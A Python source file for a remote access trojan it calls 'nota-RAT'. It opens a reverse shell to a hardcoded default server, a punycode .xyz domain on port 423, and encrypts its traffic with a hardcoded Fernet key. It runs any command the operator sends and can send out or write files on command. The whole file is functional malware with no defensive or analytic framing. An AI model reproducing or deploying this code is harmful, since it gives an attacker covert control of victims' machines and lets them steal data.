import socket
import os
import subprocess
import sys
import argparse
from cryptography.fernet import Fernet


parser = argparse.ArgumentParser(
    description="nota-RAT, python reverse shell using sockets."
)

parser.add_argument("host", default= "xn--6pw65a019d.xyz", nargs="?", help="Address of the Server.")

parser.add_argument(
    "-p", "--port", default=423, help="Port the Server is running on.", type=int
)

args = parser.parse_args()
SERVER_HOST = args.host
SERVER_PORT = args.port
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"
key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='


s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
cwd = os.getcwd()
cwd = Fernet(key).encrypt(cwd.encode())
s.send(cwd)

while True:
    command = s.recv(BUFFER_SIZE)
    command = Fernet(key).decrypt(command).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        disconnected_msg = " disconnected quietly"
        disconnected_msg = f"\n{IPAddr}{disconnected_msg}"
        disconnected = Fernet(key).encrypt(disconnected_msg.encode())
        s.send(disconnected)
        break
    if command == "/getfile":
        filename = s.recv(BUFFER_SIZE)
        filename = Fernet(key).decrypt(filename).decode()
        if filename in os.listdir():
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                s.send(dataLen.to_bytes(4,'big'))
                s.send(data)
            f.close()
    if command == "/sendfile":
        filename = s.recv(1024)
        filename = Fernet(key).decrypt(filename).decode("utf-8")
        remaining = int.from_bytes(s.recv(4),'big')
        f = open(filename,"wb")
        while remaining:
            data = s.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    message = Fernet(key).encrypt(message.encode())
    s.send(message)
s.close()